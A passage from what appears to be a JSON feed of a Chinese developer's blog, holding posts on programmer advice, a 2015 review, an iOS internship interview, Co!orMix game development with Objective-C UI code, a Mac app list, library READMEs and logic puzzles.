Bootstrap\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"作为一个码农，你还需要了解什么？","permalink":"http://blog.cee.moe/secrets-that-a-programmer-should-know.html","link":"http://blog.cee.moe/secrets-that-a-programmer-should-know.html","date":"2016-02-05T00:00:00-08:00","modified":"2016-02-05T07:21:27-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"统计了一下公共号后台所回复的信息，结合自身的思考给大家一些提示。\n\n学会使用合适的搜索引擎\n\n搜索，就要选算法好的 Google，而且请学会看英文。Google 能够提供很多的功能，例如：\n\n\n  指定站内搜索：比如想搜索 Blog 中和 ColorMix 有关的文章，输入 ColorMix site:blog.cee.moe 即可\n  星号模糊搜索：例如 支持*吼不吼\n  指定类型文件搜索：加上 filetype 参数即可，例如 论文名称 filetype:pdf\n  等等，具体可以参看 https://www.zhihu.com/question/28013848\n\n\n百度不是什么正经的东西，最近有很多的负面新闻已经报道了，不再一一赘述。如果没法去外面看看的童鞋推荐使用必应。\n\n此外码农需要多多接触 StackOverflow，其实很多你们犯过的问题大多都能在上面搜索得到。\n\n挑选一款合适的文本编辑器\n\n当碰到「你会推荐用什么文本编辑器？」这种问题时，我都会比较小心谨慎地推荐你使用 Sublime Text 或者 Atom，因为并不想发起 Vim 和 Emacs 之争。自然以上都是玩笑话，用什么文本编辑器还是得看个人习惯。文本编辑器用顺了比其他一切都重要。所以尽早挑定一款适合自己的文本编辑器吧！当发现另有一款能够提高效率的文本编辑器时，请尽早切换过去（例如 Nano → Vim，并不是说 Emacs 不好）。\n\n学会一种项目管理的技能\n\n同样，重要的不是你会 Git 还是 SVN，更重要的是培养这种项目管理的技能。知道数据的重要性，懂得为什么能够通过这样的版本控制系统来保存你的文件。学会使用 Git 或者 SVN 的最基础的功能。尤其是随着 Git 的普及，更多得懂一些 Git 的高级知识显得格外的重要。感谢 @loddit 推荐了一篇关于如何写好 Commit 做好 Code Review 的文章。\n\n学会如何和团队的成员沟通和写作，使用你们所用的项目管理工具进行无缝交流和对接。\n\n懂一点设计\n\n带上一本小本子、一支笔，背上包，出去走走。碰到灵感来了，马上拿出来把灵感记录下来，甚至画下来。\n\n打开电脑上的 Sketch、Photoshop 还有 Illustrator，用简单的图形构建出理想的那种感觉。从点到线再到面，从草稿到原型到产品，在设计中会不断提升对产品的理解（越是理解产品，越能写出好代码哦）。\n\n最后记得永远将健康和自由放在首位\n\n引用一段话：「要为自己喜欢的而活；健康与自由比一切都重要；业余爱好和工作一样重要；有能力的人绝不加班；远离那些不聪明且勤奋的人。」\n\n当自己经历过重大的健康问题之后，这两点才会显得如此重要。太多人在浪费时间，消耗青春，做着自己不喜欢的事情。为何不停下来考虑清楚「自己想做的到底是什么」这个问题呢？与其在无聊地敲代码，不如多去健身、出 Cos 或者勾搭妹子啊（下一期一定会讲如何勾搭妹子了）！\n\n\n\n最后发一个并没有关注本公共号的童鞋的留言，很有哲理，不做评价，聪明人自然懂了：\n\n\n  汝果欲学诗，功夫在诗外。我觉得，问怎样做好程序员而需要学习那些 Coding 之外的东西这种问法本身就已经本末倒置了。应该是怎样做一个自己理想中的人，以 Coding 这种行为方式实践自己的理想。\n\n","excerpt":"统计了一下公共号后台所回复的信息，结合自身的思考给大家一些提示。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Oh My 2015","permalink":"http://blog.cee.moe/Oh-My-2015.html","link":"http://blog.cee.moe/Oh-My-2015.html","date":"2015-12-31T00:00:00-08:00","modified":"2015-12-30T08:08:17-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Summary\nBe ready on the way to 30.\n\nMoments\n1 GIF\n\n2 心脏问题复发\n\n3 运营初探\n\n3 布丁动画 2.0\n\n4 地铁三号线 Day 1\n\n4 苹果表第一天就到了\n\n5 正式录了第一首歌\n\n6 Co!orMix 上线\n\n7 iPad 失而复得\n\n8 新身份证\n\n8 Miyu Project\n\n9 各种聚会\n\n10 开始去健身房\n\n10 NEXT 2.0 上线\n\n10 OK 帮上线\n\n11 巨额奖学金\n\n11 最后一门课程结束\n\n12 心脏手术\n\n12 🎂20\n\nInput &amp; Output\n\n- rMBP (Late 2013)\n\n- iPad mini 2 （Silver）\n\n+ rMBP (Mid 2014)\n\n+ iPhone 5c (Yellow)\n\n+ Apple Watch Sport\n\n+ iPhone 6s Plus (Rose Gold)\n\n+ Sony Z3 (l55t)\n\n+ Synology DS215j\n\nNumbers\n\n  3,125 photos\n  15 posts\n  1,089 twitter followers\n  251 instagram followers\n  6 books\n  708 contributions\n  43,677 lines of code\n    \n      Objective-C\n      HTML\n      SASS/CSS\n      JavaScript\n      Swift\n    \n  \n\n\nHall of Fame\n\n  年度 iOS 应用：Spark\n  年度 Mac 应用：LICEcap, Quiver, Sketch, Tower, Ulysses\n  最喜欢的游戏：LYNE\n  最喜欢的歌手：fhána\n  最喜欢的歌曲：ワンダーステラ\n  离不开的设备：iPhone\n\n\nThe Next\n\n  Release Miyu\n  Be a Dribbble Player\n  做一个合格的 PM\n  启动微信公众号\n  继续每年都会做的事情\n\n\nSpecial Thanks\n\n  @ElaWorkshop\n  @Swiftgg\n  @Lightory\n\n","excerpt":"Summary\nBe ready on the way to 30.\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"猿题库实习面试经历","permalink":"http://blog.cee.moe/ytk-intern-experience.html","link":"http://blog.cee.moe/ytk-intern-experience.html","date":"2015-12-08T00:00:00-08:00","modified":"2015-12-08T03:20:24-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"2015/12/08 17:05 Update\n\n本文并不是说猿题库不好，猿题库也是我很向往的一家公司。文中所面试本人的两位都是业内菊苣级别的人物。一千人的心中就有一千个哈姆雷特，只不过在流程上做的不好，所以给面试者（本人）留下的是一种负面的影响。\n\n\n\n每次面试完都会有一篇面经，猿题库也不例外，还是要来说一下的。\n\n约的 12.7 的下午两点半开始面试。一面面试官是 Lancy，二面是毛佳俊。\n\n（下面就只谈谈题目，答案各自都有各自的答案:) ）\n\n一面\n\n\n  理所当然简单介绍一下自己和做过的项目，没什么好说的都在简历上。\n  谈一下项目中感触最深的一个：自然是 ColorMix，因为从设计到上市场都走了一遍，时间也很紧。\n  做过的项目中遇到的最大的问题是什么，如何解决的：\n 这个问题重点谈一下，当时是在布丁动画写音频弹幕的时候遇到了比较大的问题。\n 先问了我一些 AVFundation 的知识比较容易。\n 然后问弹幕如何实现——类似于 TableView 一样的重用机制，NSRunLoop、NSOperationQueue 的考察。\n 询问了一下你们是如何做大量弹幕的处理的：切片，time+offset。\n  property 的默认属性有什么。\n  笔试题，给定两个 str1，str2（比如「BDAFEC」和「DAFCEA」）作为起始和终止态和一个交换规则（B &lt;–&gt; A），能否从 str1 转换为 str2。\n\n\n二面\n\n\n  你是来实习还是来做正式员工？此时我心中千万头草泥马飞奔而过。\n  讲一下自我经历。\n  添加圆角的方式有几种。性能如何？\n  上面提到了 UIBezierPath 讲一下怎么画直线曲线，CG 几个类中有什么方法，drawRect 的性能会有什么问题。\n  Masonry（或者 Autolayout）如何使用，当键盘弹出时一个 View 需要加动画如何更改它的 Contraints。\n  当 TabelViewCell 高度是可变的的时候如何优化性能。（需要包括 iOS7）\n  笔试题：翻转单向链表中的一段。\n\n\nHigh\n\n\n  问的问题是面到现在非常详细的一次。深度很广。\n  中间还让我停下来赶紧吃药。\n\n\nLow\n\n\n  整个面试过程（从定时间到面试）都是在用 QQ！用 QQ 视频面试真的很 Low，而且整个面试过程没有一封正式的邮件！\n  二面的第一个问题真是气到爆炸。\n  代码题考了两道算法。如果不会 C 的话，我怎么做第二题呢？\n  面试官都感觉阴阳怪气。\n  面试过程全是对方在面我，连一个提问的机会都没有！还经常打断我回答！\n  最后都是以「我们时间很紧」匆匆结束。虽说有一个小时，但是感觉没有认认真真地对待面试人员。\n\n\n\n\nP.S. 几个问题的答案也希望大家在评论区积极地讨论一下~\n\nP.S.2 业务驱动 or 技术驱动？I don’t know, and don’t ask me.\n","excerpt":"2015/12/08 17:05 Update\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"About Co!orMix (3) - Co!orMix 小记：关于开发的那点儿事","permalink":"http://blog.cee.moe/about-colormix-3.html","link":"http://blog.cee.moe/about-colormix-3.html","date":"2015-09-10T00:00:00-07:00","modified":"2015-09-10T08:31:23-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"关于 Co!orMix\n\n前几天， Cee 童鞋把 Co!orMix 开源了。当时刚上架的时候，团队里的另外两个童鞋都发了文，@Cee 讲产品，@Albus 讲设计（这两篇文章都在 V2EX 上发布过）。\n\n既然代码开源了，那是时候说一下项目本身了。\n\nCo!orMix 里面并没有什么特别有技术含量的东西，可以说，任何一个人都可以毫不费力地把它做出来。对于新手来说，也值得一试。不过毫不谦虚地说，如果要达到零错误率，还是有一定难度的，而上线至今，它的 Crash 率一直保持在 0 ，这是我所引以为豪的。（欢迎大家试玩！偷偷说一句，我可是跟组里承诺过，只要出现一个 crash ，就请吃饭的哦！）\n\n动手之前的思考\n\n无论是多简单的项目，开动之前必须要思考一下大致的架构。 Co!orMix 本身是一个相对很简单的游戏。\n\n从页面考虑：主页、设置页、游戏界面、游戏结果页、引导页；\n从游戏本身考虑：题目、选项、得分、策略、游戏模式。\n\n第一天晚上我们三个人商量出了游戏的大致功能和规则，我和 Cee 便直接开始讨论起了实现。由于游戏本身的复杂度不高，我们决定采用最传统的 MVC 来完成这个应用。\n\n\n  \n    Model 层\nCMCard ：卡片（对应游戏界面上半部分）\nCMColor ：颜色（游戏中所对应的颜色的概念）\nCMQuestion ：问题（包含 CMCard ，以及对应的 Option 和 Answer ）\nCMScene ：游戏场景（对应一次游戏，根据游戏模式区分不同表现）\nFactory ：工厂（工厂模式，生产问题）\n  \n  \n    View 层 \nCMCardView ：卡片 View\nCMQuestionView ：问题 View\nCMScoreView ：得分\n  \n  \n    Controller 层\nCMClassicTutorialViewController/CMFantasyTutorialViewController ：新手引导\nCMGameResultViewController ：游戏结果\nCMGameViewController ：游戏界面\nCMMenuViewController ：游戏菜单界面\nCMSettingViewController ：游戏设置界面\n  \n\n\n项目结构\n\n由于项目比较简单，所以并没有按照功能模块进行分类，项目的结构大致如下：\n\n\n  \n    \n      目录\n      职能\n    \n  \n  \n    \n      Category\n      工具、扩展类\n    \n    \n      ViewController\n      Controller 层\n    \n    \n      View\n      View 层\n    \n    \n      Model\n      Model 层\n    \n  \n\n\n项目并没有使用任何第三方库（除了友盟统计），所以自然也就没有使用 Cocoapods 了。\n\n关于开发细节\n\n\n  规范\n\n\n项目主体编码主要是我负责的，@Cee 在初期做了 Code Review 工作（惊讶吧！这么小的项目还做 Code Review ）。开发在 dev 分支做，记得第一次提交的时候，@Cee 写了 N 个 comments ，很多都是关于 Coding Style 的问题（我自认已经很注意了，但是在某个人的强迫症面前根本不值一提），改完了所有的问题。之后就更加小心地完成编码工作。最后通过 Pull Request 合并进主分支。之后又开发了 Android 版本，感兴趣的童鞋可以去 dev_android 的分支看一下安卓版本，实现的大致逻辑和 iOS 差不多。\n\n\n  适配\n\n\n项目采用 xib + AutoLayout + Size Classes 完成界面搭建，这也是我们第一次尝试使用 Size Classes 。\n总体来说，算是不错的一次实践， 0 代码完成全平台适配。我们以游戏界面中的 QuestionView 为例（CMQuestionView）做一下介绍，这个界面算是相当相当的典型了！\n\n\n\n分析一下这个界面，基本可以分三部分：卡片、问题、选项。这里我总共分了三个 View 来区分，分别为 Options 、 Card 、 Question ，其中 Options 是撑满整个 View 的。（参看 Fantasy 模式下的表现）\n\n可以注意一下这里还有一个背景占位符，它是一个垫在最底层撑满整个屏幕的透明的 View ，用来给其他 subview 做尺寸上的参考，比如 Card 部分的高度所做的约束通过背景占位符高度的一半来限定。\n\n另外分享一个小的 Tip ，在 xib 中可以直接通过右侧的选项实时查看不同设备下界面的布局：\n\n\n\n再有就是 Tutorial 的这个界面，细心的用户也会发现也是全适配的。我们的游戏引导界面并没有单纯地使用图片，而是在原有的游戏界面上加上了对应的引导元素，不管是箭头还是文字都是使用 AutoLayout 拉的约束。\n\n\n\n\n  分享\n\n\n为求最简，我们的分享使用的系统原生的 UIActivityViewController 来实现。不过这里在适配的时候遇到了个坑，直接上代码：\n\n- (IBAction )onShareButtonClicked:(id )sender {\n    [MobClick event:@\"Share\"];\n    CMScoreView *scoreView = [[CMScoreView alloc] initWithScore:self.score];\n    UIImage *imageToShare = [UIImage captureImageFromView:scoreView];\n    NSString *stringToShare = [NSString stringWithFormat:@\"I scored %ld in the %@ mode, play #Co!orMix with me: %@\", (long )self.score, self.gameMode == classicMode ? @\"classic\" : @\"fantasy\" , kAppStoreUrl ];\n    NSArray *activityItems = [[NSArray alloc] initWithObjects:imageToShare,stringToShare, nil];\n    UIActivityViewController *activityVC = [[UIActivityViewController alloc] initWithActivityItems:activityItems applicationActivities:nil];\n    activityVC.excludedActivityTypes = @[UIActivityTypeSaveToCameraRoll];\n    if (IS_IPAD ) {\n        UIPopoverController *popup = [[UIPopoverController alloc] initWithContentViewController:activityVC];\n        self.shareController = popup;\n        popup.delegate = self;\n        [popup presentPopoverFromRect:CGRectMake (self.view.frame.size.width / 2, self.shareBtn.frame.size.height + self.shareBtn.frame.origin.y , 0, 0 )inView:self.view permittedArrowDirections:UIPopoverArrowDirectionUp animated:YES];\n    } else {\n        [self presentViewController:activityVC animated:YES completion:nil];\n    }\n}\n\n\n对于 UIActivityViewController，在 iPhone 上，我们可以直接使用 present 的方式；但是在 iPad 上，这会引起崩溃，可以使用 UIPopoverController 来包装 UIActivityViewController。\n\n\n  设置界面的效果\n\n\n\n\n个人还是很喜欢这个效果的，使用的是 iOS8 自带的毛玻璃效果。上代码：\n\n- (IBAction )onSettingButtonClicked:(id )sender {\n    [MobClick event:@\"Setting\"];\n    self.settingViewController = [[CMSettingViewController alloc] initWithNibName:NSStringFromClass ([CMSettingViewController class]) bundle:nil];\n    self.settingViewController.view.frame = self.view.bounds;\n    self.settingViewController.view.alpha = 0;\n    [self.view addSubview:self.blurView];\n    [self.view addSubview:self.settingViewController.view];\n    [self addChildViewController:self.settingViewController];\n    [UIView animateWithDuration:0.3 delay:0 options:UIViewAnimationOptionCurveEaseInOut animations:^{\n        _blurView.alpha = 1;\n        self.settingViewController.view.alpha = 1;\n    } completion:nil];\n}\n\n- (UIView *)blurView {\n    if (!_blurView ) {\n        _blurView = [[UIVisualEffectView alloc] initWithEffect:[UIBlurEffect effectWithStyle:UIBlurEffectStyleDark]];\n        _blurView.frame = [[UIScreen mainScreen] bounds];\n        _blurView.alpha = 0;\n    }\n    return _blurView;\n}\n\n\n\n  GameCenter 和友盟\n\n\n这两块都是 @Cee 负责弄的。友盟的接入相对简单，不过 GameCenter @Cee 弄了一晚上，还吐槽网上没有成熟的 GameCenter 接入指南，我觉得有必要让他专门写一份了。\n\n\n  面向对象\n\n\n项目虽小，可以用任何方式实现。不过这样一个小项目可以把面向对象思想很好地加以实践。所有的类都实现了对应的职能，隐藏了内部细节。\n\n总结\n\n以前写过不少项目，不过都比较庞大，而且基本都是负面教材。 Co!orMix 是一个小而精的 App ，从萌生想法，到 Demo ，到设计出炉正式完工，整个周期一共就一星期：设计花了一整天做出了可供交互的原型；在代码上只花了两天，但是却不仓促。代码均在 GitHub 上托管，测试上使用 TestFlight 完成分发，通过种子用户的体验修改游戏参数，提高用户体验。同时兼顾各种极端操作，保证代码安全性，做到零错误率。\n\n简单来说，对于新手来说，大家可以先下一下这个 App ，感兴趣的可以自己实现一遍，一点都不困难！然后再对比一下我们的实现。如果 Co!orMix 有任何不合理的地方，也欢迎指正！\n\n最后欢迎大家体验！\n\n\n  \n    Website: http://colormix.cee.moe\n  \n  \n    Twitter: @ColorMix_Game\n  \n  \n    戳我进入 iTunes 下载\n  \n  \n    二维码下载：\n\n    \n  \n\n","excerpt":"关于 Co!orMix\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Apps on Tsukiko","permalink":"http://blog.cee.moe/Apps-on-Tsukiko.html","link":"http://blog.cee.moe/Apps-on-Tsukiko.html","date":"2015-08-19T00:00:00-07:00","modified":"2015-08-19T07:50:45-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Q：「Tsukiko / 月子」是什麼？\n\nA：僅僅是我的 Macbook 的名字。\n\n（無語…）\n\n\n\n今天正好整理了一下我的應用程序，順便推薦了一些給了 Lynn。\n\n以下均為一句話概括！\n\n\n  \n    1Password 5：強大的密碼記錄和生成的軟件！\n  \n  \n    Aegisub：字幕組打軸特效專用。\n  \n  \n    Alfred 2：快速啟動神器，配合 Workflow 使用更佳。\n  \n  \n    AliWangWang：買買買，剁手必備！\n  \n  \n    Alternote：好用的 Evernote 客戶端，可惜略貴。一直在蹭 Beta 版的。\n  \n  \n    Amphetamine：防止電腦休眠，自己也不常用。\n  \n  \n    Android File Transfer：管理安卓手機文件的工具。\n  \n  \n    Android Studio：Google 推出的基於 IntelliJ IDEA 的安卓開發 IDE，比 Eclipse 不知道高到哪裡去了。配合 Genymotion 使用更好！\n  \n  \n    AppCode：JetBrains 家用來寫 Objective-C 的 IDE。\n  \n  \n    Atom：文本編輯器，卡卡卡，畢竟是 Web，自己還是喜歡用 Sublime。\n  \n  \n    Bartender：整理 Menubar 專用。喜歡簡潔乾淨的 Menubar 必備！\n  \n  \n    BetterTouchTool：手勢還有控制屏幕大小。（有部份 Moom 的功能，El Capitan 要出了還是不買了）\n  \n  \n    BitTorrent Sync：分佈式同步工具，方便自己在不同電腦上同步文（tu）件（pian）。\n  \n  \n    Blackmagic Disk Speed Test：磁盤測速，每年也就用那麼兩次。\n  \n  \n    Brackets：很不錯的做網頁的 IDE，被 Adobe 收購了。\n  \n  \n    Charles：網絡抓包工具，很實用！\n  \n  \n    CleanMyMac 2：買不起 3，繼續用 2 來清理我的電腦。\n  \n  \n    CodeRunner：用過試用版沒有買，很棒的小巧的運行代碼的編輯器。\n  \n  \n    Dash：查文檔專用！不過 10 秒的等待很坑爹。\n  \n  \n    Day One：日記，偶爾做 Markdown 編輯器用。\n  \n  \n    Deploymate：檢測代碼中是否有被廢棄或者無法在低版本上運行的 API。\n  \n  \n    Dropbox：同步，容量好小 QwQ。\n  \n  \n    Droplr：分享短連接，可以分享圖片、視頻和文字或者其他文件。\n  \n  \n    Duet：讓你的 iPhone / iPad 成為第二塊顯示屏！\n  \n  \n    Evernote：臃腫的大象，偶爾用了。\n  \n  \n    Fantasitcal 2：日曆管理。\n  \n  \n    FileZilla：FTP GUI 工具。\n  \n  \n    FirefoxDeveloperEdition：你是個前端都會備著這個。\n  \n  \n    GenyMotion：配合 AS 使用的，作為 Android 虛擬機。\n  \n  \n    GhostNote：丟過數據，不解釋。\n  \n  \n    GoAgentX：咳咳。\n  \n  \n    Google Chrome：吃我內存啦 (╯‵□′)╯︵┻━┻。\n  \n  \n    Hammer：構建網頁。\n  \n  \n    HandBrake：壓制視頻。\n  \n  \n    Haroopad：用到現在感覺最好而且是免費的用來寫 Markdown 文件的 App！\n  \n  \n    HockeyApp：收集 Crash 信息。\n  \n  \n    IconJar：存儲 icon，分類。\n  \n  \n    ImageOptim：壓縮圖片。\n  \n  \n    Inboard：Xhacker 寫的一個用於素材歸檔的 App，很好用。\n  \n  \n    IntelliJ IDEA 14：JetBrains 家用來寫 Java 的 IDE。\n  \n  \n    iStat Menus：放在 MenuBar 上用於顯示系統信息，還能控制風扇轉速！\n  \n  \n    iTerm：默認的 Terminal，網上很很多文章介紹為什麼要選擇 iTerm。順便使用 zsh 效果更佳。\n  \n  \n    Karabiner：當接上外接鍵盤時屏蔽內置鍵盤。\n  \n  \n    Keka：解壓，想換成 Entropy 了（沒錢啊）！\n  \n  \n    Kindle：看電子書。\n  \n  \n    Knock：利用 iPhone 敲兩下來解鎖電腦。\n  \n  \n    Koala：為 Sass / Less 生成 Css 文件。\n  \n  \n    LineIn：混音專用，配合 Sunflower。\n  \n  \n    MailPlane 3：收取 Gmail 郵件，我的默認郵件客戶端。\n  \n  \n    Manico：快速切換 App。\n  \n  \n    Memory Clean：清理內存。\n  \n  \n    Miao：刷新浪微博專用，以前是要付費的，現在因為新浪微博 API 的限制改為免費。\n  \n  \n    Microsoft OneNote：替代了 Evernote。\n  \n  \n    Microsoft Remote Desktop：用於連接我的 Windows 電腦。\n  \n  \n    Mounty：掛載 NTFS。\n  \n  \n    Movist：最好用的視頻播放器！\n  \n  \n    MPlayerX：第二好用的視頻播放器！\n  \n  \n    NeteaseMusic：網易云音樂，偶爾用，主要還是 iTunes 和 Vox。\n  \n  \n    OBS：Twitch 直播。\n  \n  \n    Parallels Desktop 9：奸商，買不起。\n  \n  \n    Paste：剪貼板，很贊（可以用 Alfred 自帶的，不過沒這個好）。\n  \n  \n    Paw：超棒的調試 API 的工具。\n  \n  \n    Phpstorm：JetBrains 家用來寫 PHP（世界上最好的語言）的 IDE。\n  \n  \n    Pixate Studio：做交互稿用。\n  \n  \n    Pocket：稍後閱讀！\n  \n  \n    PopClip：選中文字后有個小的彈窗，能做很多事情！\n  \n  \n    Prepo：裁剪 icon 圖標。\n  \n  \n    Pushbullet：給其他設備發送通知。\n  \n  \n    QQ：聊天。\n  \n  \n    Quartz Composer：做原型和交互。\n  \n  \n    Quip：同步一些文檔，也沒怎麼用過。\n  \n  \n    RescueTime：記錄我一天都幹了什麼！配合 WakaTime 使用！\n  \n  \n    Reveal：iOS 開發用，強大的透視圖。\n  \n  \n    RightFont：挑選一款字體真的很難，它能幫到你。\n  \n  \n    Scroll Reverser：鼠標滾輪能夠正常滾動。\n  \n  \n    Server：自帶一個 Web 服務器還有 Xcode Server。\n  \n  \n    Sip：吸取顏色，自動變成代碼。\n  \n  \n    Skala Preview：同步到手機上預覽圖片（設計稿）。\n  \n  \n    Sketch：替代了 PS 和 AI 做設計稿了，矢量的哦！\n  \n  \n    Slack：團隊交流工具。\n  \n  \n    SoundFlower：錄音混音工具。\n  \n  \n    SourceTree：GUI 的 Git 管理工具。\n  \n  \n    Steam：買，買，買，男人的淘寶。\n  \n  \n    Sublime Text：最好的文本編輯器。\n  \n  \n    TeamViewer：遠程桌面軟件。\n  \n  \n    Telegram：最好用的 IM，多平台支持。\n  \n  \n    Tunnelblick：OpenVPN。\n  \n  \n    Tweetbot：替代 Twitter 的 Twitter 客戶端。\n  \n  \n    Twitter：被 TweetBot 替代啦！\n  \n  \n    Typed：Markdown 編輯器。\n  \n  \n    Typora：又是一個 Markdown 編輯器。\n  \n  \n    VirtualBox：裝 GenyMotion 必需。\n  \n  \n    VOX：音樂播放器，支持 Flac 等 iTunes 不支持的格式。\n  \n  \n    WebStorm：JetBrains 家用來寫 Web 的 IDE。\n  \n  \n    WeChat：微信 Mac 客戶端。\n  \n  \n    WWDC：學習 WWDC 中的 Session，在 GitHub 上開源。\n  \n  \n    Xcode：碼農必備。\n  \n  \n    Yu：白噪音軟件。\n  \n\n","excerpt":"Q：「Tsukiko / 月子」是什麼？\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"PFAvatar","permalink":"http://blog.cee.moe/PFAvatar.html","link":"http://blog.cee.moe/PFAvatar.html","date":"2015-08-08T00:00:00-07:00","modified":"2015-08-08T07:20:15-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Generate material design avatar!\n\n\n\nTodo\n\n\n  [ ] Custom Fonts\n\n\nLicense\n\nReleased under the MIT License.\n","excerpt":"Generate material design avatar!\n\n","languages":null,"categories":["work"],"tags":[]},{"title":"PFNavigationDropdownMenu","permalink":"http://blog.cee.moe/PFNavigationDropdownMenu.html","link":"http://blog.cee.moe/PFNavigationDropdownMenu.html","date":"2015-08-02T00:00:00-07:00","modified":"2015-08-05T04:52:06-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"The Objective-C version of BTNavigationDropdownMenu. Supports iOS 7.0+.\n\nInstallation\nThe simplest option is to use pod \"PFNavigationDropdownMenu\".\n\nYou can also add the Classes folder to your project. There are no further requirements.\n\nUsage\nSee BTNavigationDropdownMenu Usage Part.\n\nRequirement\n\n  iOS 7.0+\n\n\nLicense\nReleased under the MIT License.\n","excerpt":"The Objective-C version of BTNavigationDropdownMenu. Supports iOS 7.0+.\n\n","languages":null,"categories":["work"],"tags":[]},{"title":"Pangu.objective-c","permalink":"http://blog.cee.moe/Pangu.objective-c.html","link":"http://blog.cee.moe/Pangu.objective-c.html","date":"2015-07-27T00:00:00-07:00","modified":"2015-08-05T04:53:38-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Paranoid text spacing for good readability, to automatically insert whitespace between CJK (Chinese, Japanese, Korean), half-width English, digit and symbol characters.\n\n\n  Go version: pangu.go\n  Java version: pangu.java\n  JavaScript version: pangu.js\n  Node.js version: pangu.node\n  Python version: pangu.py\n  Ruby version: pangu.rb\n\n\nInstallation\n\nThe simplest option is to use pod \"Pangu\".\n\nYou can also add the two files NSString+Pangu.h/m to your project. There are no further requirements.\n\nUsage\n\n#import \"NSString+Pangu.h\"\n\n[NSString spacing:@\"請問Jackie的鼻子有幾個？123個！\"];\n// 請問 Jackie 的鼻子有幾個？123 個！\n\n\nLicense\n\nReleased under the MIT License.\n","excerpt":"Paranoid text spacing for good readability, to automatically insert whitespace between CJK (Chinese, Japanese, Korean), half-width English, digit and symbol characters.\n\n","languages":null,"categories":["work"],"tags":[]},{"title":"趣题","permalink":"http://blog.cee.moe/funny-logic-questions.html","link":"http://blog.cee.moe/funny-logic-questions.html","date":"2015-07-17T00:00:00-07:00","modified":"2015-08-05T02:09:04-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  \n    C 随机产生了两个不同的正整数，分别交给了 A、B，并让两人猜测谁手中的数更大。\n\n    A：不知道。\n\n    B：不知道。\n\n    A：还是不知道。\n\n    B：还是不知道。\n\n    A：知道了。\n\n    B：那我知道了，而且这两个数具体是多少也知道了。\n\n    问这两个数是多少。\n  \n  \n    C 从 2 - 99 中随机产生了两个不同的正整数，把它们的和与积分别交给了 A、B，并让两人猜测这两个数分别是多少。\n\n    A：虽然我不知道这两个数是什么，但是我知道你也不知道。\n\n    B：那我知道了。\n\n    A：那我也知道了。\n\n    问这两个数是多少。\n  \n  \n    C 随机产生两个不同的形如 n – 1/2^k – 1/2^(k+r) 的数，其中 n、k 是正整数，r 是非负整数。然后，C 把这两个数分别交给了 A、B，并让两人猜测谁手中的数更大。\n\n    A ：我不知道。\n\n    B ：我也不知道。\n\n    A ：我还是不知道。\n\n    B ：我也还是不知道。\n\n    C ：这样下去是没有用的！可以告诉你们，不管你们像这样来来回回说多少轮，你们仍然都没法知道，\n谁手中的数更大一些。\n\n    A ：哇，这个信息量好像有点儿大！不过，即使知道了这一点，我还是不知道谁手中的数更大。\n\n    B ：我也还是不知道。\n\n    A ：我继续不知道。\n\n    B ：我也继续不知道。\n\n    C ：还是套用刚才的话，不管你们像这样继续说多少轮，你们仍然没法知道谁手中的数更大。\n\n    A ：哦……不过，我还是不知道谁手中的数更大。\n\n    B ：而且我也还是不知道。我们究竟什么时候才能知道呢？\n\n    C ：事实上啊，如果我们三个就像这样继续重复刚才的一切——你们俩互相说一堆不知道，我告诉你们这样永远没用，然后你们继续互说不知道，我继续说这不管用——那么不管这一切重复多少次，你们仍然不知道谁手中的数更大！\n\n    A ：哇，这次的信息量就真的大了。只可惜，我还是不知道谁的数更大一些。\n\n    B ：我也还是不知道。\n\n    A ：是吗？好，那我现在终于知道谁的数更大了。\n\n    B ：这样的话，那我也知道了。而且，我还知道我们俩手中的数具体是多少了。\n\n    A ：那我也知道了。\n\n    问这两个数是多少。\n  \n\n\n参考：Matrix67 - 趣题：无限多层嵌套的逻辑推理\n","excerpt":"\n  C 随机产生了两个不同的正整数，分别交给了 A、B，并让两人猜测谁手中的数更大。\n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"About Co!orMix (2) - StroopMix!","permalink":"http://blog.cee.moe/about-colormix-2.html","link":"http://blog.cee.moe/about-colormix-2.html","date":"2015-07-07T00:00:00-07:00","modified":"2015-08-03T05:07:20-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  本文作者為 UI/UX 設計師 @albuszheng 所寫。\n\n\n\n  原文地址：http://blog.zky.science/about-coormix-stroopmix/\n\n\nWell，这个题目其实并没有什么特别深层的含义，只是比较表明的理解就可以了。当然，这不是什么专门来介绍 Stroop Effect 的。其实我只是想记录一下关于自己最近参与的一个 iOS 游戏 Co!orMix，和它诞生背后的一点小故事。\n\nCo!orMix 本身是一个非常简单的小游戏，至少我们从制作的角度来说，或者从玩法来说。简而言之，就是要在限定的时间内选出合适的颜色；至于什么颜色是合适，这个就比较复杂了，它可以是屏幕的背景色，可以是屏幕上字的颜色，或者就是屏幕上那个单词的意思了（不用担心，这些单词都是对颜色的描述）。\n\n废话到此，神秘的 Stroop Effect 还没有被正式的介绍过。不过，再次简而言之，这是被一位叫 John Ridley Stroop 的心理学家第一次发现的一种现象，所以就有了这个名字。具体一点，Stroop Effect 是对某一项任务反应时间的干扰的阐述，比较简单的例子就是文字和颜色了。比如用红色墨水写下的「蓝色」二字，无论你是需要说出墨水的颜色还是文字的意思都会收到另一方面的干扰，而影响你的反应时间。这也是 Stroop Effect 最初被发现的原因。\n\n当然那时候的实验要复杂的多，毕竟是要发文章的。为了防止这篇文章变成一片长篇大论的实验演示问，我按耐了内心的冲动，忍痛删掉了那个实验的过程。其实还是蛮有意思的。但是我们要回到主题上，经过刚刚简单的解释，你大概已经发现，其实 